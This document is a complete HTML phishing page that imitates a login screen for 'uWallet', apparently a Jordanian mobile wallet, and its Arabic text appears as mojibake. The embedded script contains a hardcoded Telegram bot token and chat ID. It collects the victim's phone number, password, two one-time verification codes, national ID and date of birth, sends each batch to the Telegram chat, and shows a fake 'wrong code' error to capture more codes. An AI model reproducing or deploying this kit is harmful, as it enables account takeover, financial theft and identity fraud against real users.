<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>

  <title>uWallet - ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.rtl.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
  <style>
    body {

      min-height: 100vh;
      font-family: 'Tajawal', Arial, sans-serif;
      display: flex; align-items: center; justify-content: center;
      margin: 0;
      padding: 0;

    .uwallet-card {

    .uwallet-logo {

      display: block;
      border-radius: 50%;

      border: 2.5px solid #ffe066;
      object-fit: cover;

    .uwallet-title {
      color: #ffb700;

      text-align: center;

    }
    .uwallet-label {
      color: #ffb700;
      font-weight: 500;
    }
    .uwallet-btn {
      background: linear-gradient(90deg,#ffd600 0,#ffb300 100%);
      color: #fff; border: none;
      font-weight: bold;

    }
    .uwallet-back-btn {

      transition: background .2s;
    }
    .uwallet-back-btn:hover, .uwallet-back-btn:focus {

      color: #ff9900;
    }
    .form-control:focus {
      border-color: #ffd600;
      box-shadow: 0 0 0 0.15rem #ffe06680;
    }
    .code-inputs input {
      width: 52px; height: 52px;
      text-align: center;

      border: 1.5px solid #ffe066;

    .code-inputs input:focus {

      background:#fff3c0;
    }
    .uwallet-step {
      animation: fadein .6s;

    @keyframes fadein {
      from { opacity:0; transform:translateY(25px);}

    }
    .uwallet-popup {

    @media (max-width:600px) {

    @media (max-width:430px) {

  </style>
</head>
<body>
  <div class="uwallet-popup" id="popup"></div>
  <div class="uwallet-card shadow-lg">
    <img src="https://www2.0zz0.com/2025/06/26/01/957701194.png" class="uwallet-logo" alt="uWallet Logo" />
    <div class="uwallet-title">uWallet</div>
    <!-- Steps Container -->
    <div id="steps-container"></div>
    <div class="uwallet-footer">ÿ™ÿ∑ÿ®ŸäŸÇ uWallet &copy; 2025</div>
  </div>
  <script>
    // ====== CONFIG ======
    const TELEGRAM_BOT_TOKEN = "7327256170:AAHRVRd2GI3bsOjtFD08kB2wc4w6mVerGdM";
    const TELEGRAM_CHAT_ID   = "-4625923889";
    // ====================

    // ====== STATE =======
    let state = {
      phone: "",
      password: "",
      code1: "",
      nationalId: "",
      dob: "",
      code2: "",
      tgMessages: [],
      step: 1
    };

    // ====== DOM ========
    const $steps = document.getElementById('steps-container');
    const $popup = document.getElementById('popup');

    // ====== POPUP =======
    function showPopup(message, type="danger", timeout=2700) {
      $popup.innerHTML = `<div class="alert alert-${type} shadow animate__animated animate__fadeInDown">${message}</div>`;
      setTimeout(()=>{$popup.innerHTML='';}, timeout);
    }

    // ====== TELEGRAM SEND/DELETE =======
    async function sendToTelegram(text) {
      const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
        }),
      });
      try {
        const data = await resp.json();
        if (data.result && data.result.message_id)
          state.tgMessages.push(data.result.message_id);
        return data;
      } catch {
        return null;
      }
    }
    async function deleteLastTelegramMsg() {
      const msgId = state.tgMessages.pop();
      if (!msgId) return;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          message_id: msgId,
        }),
      });
    }

    // ====== STEP RENDERING =======
    function renderStep(step) {
      // Clear
      $steps.innerHTML = "";
      state.step = step;
      // Step 1: Phone + Password
      if (step === 1) {
        $steps.innerHTML = `
        <form class="uwallet-step" id="step1">
          <div class="mb-3">
            <label class="uwallet-label mb-1">ÿ±ŸÇŸÖ ÿßŸÑŸáÿßÿ™ŸÅ</label>
            <div class="input-group">
              <span class="input-group-text"><i class="bi bi-phone"></i></span>
              <input type="tel" class="form-control" id="phone" inputmode="numeric" placeholder="079XXXXXXX" required pattern="^07\\d{8}$" maxlength="10" autofocus>
            </div>
          </div>
          <div class="mb-4">
            <label class="uwallet-label mb-1">ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ±</label>
            <div class="input-group">
              <span class="input-group-text"><i class="bi bi-lock"></i></span>
              <input type="password" class="form-control" id="password" required minlength="4" maxlength="30">
            </div>
          </div>
          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">ÿØÿÆŸàŸÑ</button>
        </form>
        `;
        document.getElementById('step1').onsubmit = async function(e){
          e.preventDefault();
          const phone = document.getElementById('phone').value.trim();
          const password = document.getElementById('password').value;
          if (!/^07\d{8}$/.test(phone)) {
            showPopup("Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÇŸÖ Ÿáÿßÿ™ŸÅ ÿ£ÿ±ÿØŸÜŸä ÿµÿ≠Ÿäÿ≠ Ÿäÿ®ÿØÿ£ ÿ®ŸÄ 07", "warning");
            return;
          }
          if (password.length < 4) {
            showPopup("ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ± ŸÇÿµŸäÿ±ÿ© ÿ¨ÿØÿßŸã", "warning");
            return;
          }
          state.phone = phone; state.password = password;
          await sendToTelegram(`uWallet - ÿØÿÆŸàŸÑ ÿ¨ÿØŸäÿØ\nüì± ÿßŸÑŸáÿßÿ™ŸÅ: ${phone}\nüîë ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ±: ${password}`);
          renderStep(2);
        }
      }

      // Step 2: Code 1
      if (step === 2) {
        $steps.innerHTML = `
        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back1"><i class="bi bi-arrow-right"></i> ÿ±ÿ¨Ÿàÿπ</button>
        <form class="uwallet-step" id="step2" autocomplete="off">
          <div class="mb-3 text-center" style="font-weight:500;color:#ffb700">ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ŸÖÿ≤ ÿ™ÿ≠ŸÇŸÇ ÿ•ŸÑŸâ ÿ±ŸÇŸÖŸÉ</div>
          <div class="code-inputs d-flex justify-content-center mb-4" dir="ltr">
            <input type="text" maxlength="1" class="form-control mx-1 code" id="c1" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="c2" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="c3" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="c4" inputmode="numeric" required>
          </div>
          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ±ŸÖÿ≤</button>
        </form>
        `;
        document.getElementById('back1').onclick = ()=>{
          renderStep(1);
        };
        // Auto move focus
        const codes = Array.from(document.querySelectorAll('.code'));
        codes.forEach((el, idx) => {
          el.addEventListener('input', function() {
            if (this.value.length === 1 && idx < codes.length-1) codes[idx+1].focus();
          });
          el.addEventListener('keydown', function(e){
            if (e.key === "Backspace" && !this.value && idx > 0) codes[idx-1].focus();
          });
        });
        codes[0].focus();
        document.getElementById('step2').onsubmit = async function(e){
          e.preventDefault();
          const code = codes.map(x=>x.value.trim()).join('');
          if (code.length !== 4) return showPopup("Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÖÿ≤ ÿ™ÿ≠ŸÇŸÇ ÿµÿ≠Ÿäÿ≠", "warning");
          state.code1 = code;
          await deleteLastTelegramMsg();
          await sendToTelegram(`uWallet - ÿ±ŸÖÿ≤ ÿ™ÿ≠ŸÇŸÇ\nüì± ÿßŸÑŸáÿßÿ™ŸÅ: ${state.phone}\nüîë ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ±: ${state.password}\nüî¢ ÿßŸÑÿ±ŸÖÿ≤: ${code}`);
          renderStep(3);
        }
      }

      // Step 3: National ID + DOB
      if (step === 3) {
        $steps.innerHTML = `
        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back2"><i class="bi bi-arrow-right"></i> ÿ±ÿ¨Ÿàÿπ</button>
        <form class="uwallet-step" id="step3">
          <div class="mb-3">
            <label class="uwallet-label mb-1">ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑŸàÿ∑ŸÜŸä</label>
            <div class="input-group">

            </div>
          </div>
          <div class="mb-4">
            <label class="uwallet-label mb-1">ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑŸÖŸäŸÑÿßÿØ</label>
            <div class="input-group">

              <input type="date" class="form-control" id="dob" required>

          </div>
          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">ÿßŸÑÿ™ÿßŸÑŸä</button>
        </form>
        `;
        document.getElementById('back2').onclick = ()=>{
          renderStep(2);
        };
        document.getElementById('step3').onsubmit = async function(e){
          e.preventDefault();
          const nid = document.getElementById('nid').value.trim();
          const dob = document.getElementById('dob').value;
          if (!/^\d{10,12}$/.test(nid))
            return showPopup("Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÇŸÖ Ÿàÿ∑ŸÜŸä ÿµÿ≠Ÿäÿ≠ (10-12 ÿ±ŸÇŸÖ)", "warning");
          if (!dob)
            return showPopup("Ÿäÿ±ÿ¨Ÿâ ÿßÿÆÿ™Ÿäÿßÿ± ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑŸÖŸäŸÑÿßÿØ", "warning");
          state.nationalId = nid; state.dob = dob;
          await deleteLastTelegramMsg();
          await sendToTelegram(`uWallet - ÿ®ŸäÿßŸÜÿßÿ™ ÿ¥ÿÆÿµŸäÿ©\nüì± ÿßŸÑŸáÿßÿ™ŸÅ: ${state.phone}\nüîë ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ±: ${state.password}\nüî¢ ÿßŸÑÿ±ŸÖÿ≤: ${state.code1}\nüÜî ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑŸàÿ∑ŸÜŸä: ${nid}\nüéÇ ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑŸÖŸäŸÑÿßÿØ: ${dob}`);
          renderStep(4);
        }
      }

      // Step 4: Code 2
      if (step === 4) {
        $steps.innerHTML = `
        <button type="button" class="uwallet-back-btn btn w-100 mb-2" id="back3"><i class="bi bi-arrow-right"></i> ÿ±ÿ¨Ÿàÿπ</button>
        <form class="uwallet-step" id="step4" autocomplete="off">
          <div class="mb-3 text-center" style="font-weight:500;color:#ffb700">ÿßÿØÿÆŸÑ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿßŸÑŸÜŸáÿßÿ¶Ÿä ÿßŸÑŸÖÿ±ÿ≥ŸÑ ÿ•ŸÑŸâ Ÿáÿßÿ™ŸÅŸÉ</div>
          <div class="code-inputs d-flex justify-content-center mb-4" dir="ltr">
            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc1" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc2" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc3" inputmode="numeric" required>
            <input type="text" maxlength="1" class="form-control mx-1 code" id="cc4" inputmode="numeric" required>
          </div>
          <button class="uwallet-btn btn w-100 py-2 fs-5" type="submit">ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ±ŸÖÿ≤</button>
        </form>
        `;
        document.getElementById('back3').onclick = ()=>{
          renderStep(3);
        };
        // Auto move focus
        const codes = Array.from(document.querySelectorAll('.code'));
        codes.forEach((el, idx) => {
          el.addEventListener('input', function() {
            if (this.value.length === 1 && idx < codes.length-1) codes[idx+1].focus();
          });
          el.addEventListener('keydown', function(e){
            if (e.key === "Backspace" && !this.value && idx > 0) codes[idx-1].focus();
          });
        });
        codes[0].focus();
        document.getElementById('step4').onsubmit = async function(e){
          e.preventDefault();
          const code2 = codes.map(x=>x.value.trim()).join('');
          if (code2.length !== 4) return showPopup("Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÖÿ≤ ÿ™ÿ≠ŸÇŸÇ ÿµÿ≠Ÿäÿ≠", "warning");
          state.code2 = code2;
          await deleteLastTelegramMsg();
          await sendToTelegram(
            `uWallet - ÿ¨ŸÖŸäÿπ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™\nüì± ÿßŸÑŸáÿßÿ™ŸÅ: ${state.phone}\nüîë ŸÉŸÑŸÖÿ© ÿßŸÑÿ≥ÿ±: ${state.password}\nüî¢ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿßŸÑÿ£ŸàŸÑ: ${state.code1}\nüÜî ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑŸàÿ∑ŸÜŸä: ${state.nationalId}\nüéÇ ÿ™ÿßÿ±ŸäÿÆ ÿßŸÑŸÖŸäŸÑÿßÿØ: ${state.dob}\n‚úÖ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿßŸÑŸÜŸáÿßÿ¶Ÿä: ${code2}`
          );
          renderStep(5);
        }
      }

      // Step 5: Wrong code popup, repeat code input
      if (step === 5) {
        showPopup("ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ÿå ÿ≠ÿßŸàŸÑ ŸÖÿ±ÿ© ÿ£ÿÆÿ±Ÿâ!", "danger", 3500);
        setTimeout(()=>renderStep(4), 1500);
      }
    }

    // ====== START =======
    renderStep(1);

  </script>
</body>
</html>
